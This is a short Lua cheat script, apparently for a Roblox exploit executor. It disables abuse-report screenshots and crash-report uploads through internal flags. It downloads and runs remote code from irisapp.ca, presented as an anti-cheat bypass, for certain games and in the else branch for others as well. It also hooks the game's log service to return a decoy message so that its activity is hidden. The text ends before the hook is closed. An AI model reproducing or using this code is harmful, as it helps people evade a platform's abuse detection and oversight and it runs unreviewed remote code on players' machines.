-- setting flags
setfflag("AbuseReportScreenshotPercentage", 0)
setfflag("DFFlagAbuseReportScreenshot", "False")
setfflag("DFStringCrashPadUploadToBacktraceToBacktraceBaseUrl", "")
setfflag("DFIntCrashUploadToBacktracePercentage", "0")
setfflag("DFStringCrashUploadToBacktraceBlackholeToken", "")
setfflag("DFStringCrashUploadToBacktraceWindowsPlayerToken", "")
wait(5)

repeat
	wait()
until game:IsLoaded()

-- there anti is so they need to be executed a little bit later oh they won't load
-- AntiCheat by Daddy Iris
--        adopt me         arsenal
games = {"920587237"    , "286090429"}

for _, placeid in pairs(games) do
    if placeid == game.PlaceId then
        wait(10)
        loadstring(game:HttpGet("https://irisapp.ca/TheGoodSucc/iAntiCheat.lua"))()
        else
        loadstring(game:HttpGet("https://irisapp.ca/TheGoodSucc/iAntiCheat.lua"))()
        print(":: Adonis :: Has Loaded")
    end
end


print"Loading logs..."
-- Clears logs

local LogService = game:GetService("LogService")

local Old
Old = hookfunction(LogService.GetLogHistory, function(...)
    if checkcaller() then return Old(...) end
return {
    {
        message = "Stop looking here",
        messageType = Enum.MessageType.MessageInfo,
        timeStamp = 0
    }
}
